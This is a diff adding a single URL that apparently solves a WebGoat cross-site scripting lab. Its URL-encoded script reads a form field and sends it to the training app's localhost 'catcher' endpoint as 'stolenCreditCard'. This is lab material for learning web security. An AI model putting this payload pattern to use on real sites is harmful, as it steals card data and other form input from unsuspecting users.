@@ -1,0 +1,2 @@
+http://localhost:8090/WebGoat/start.mvc#attack/1908103370/900?input1=123&input2=456%3Cscript%3Econst%20XSSImage%20%3D%20new%20Image%3BXSSImage.src%20%3D%20%22http%3A%2F%2Flocalhost%3A8090%2FWebGoat%2Fcatcher%3FPROPERTY%3Dyes%26stolenCreditCard%3D%22%20%2B%20document.form.input1.value.replace(%2F%5Cs%2B%2Fg%2C%20%27%27)%3B%3C%2Fscript%3E
+
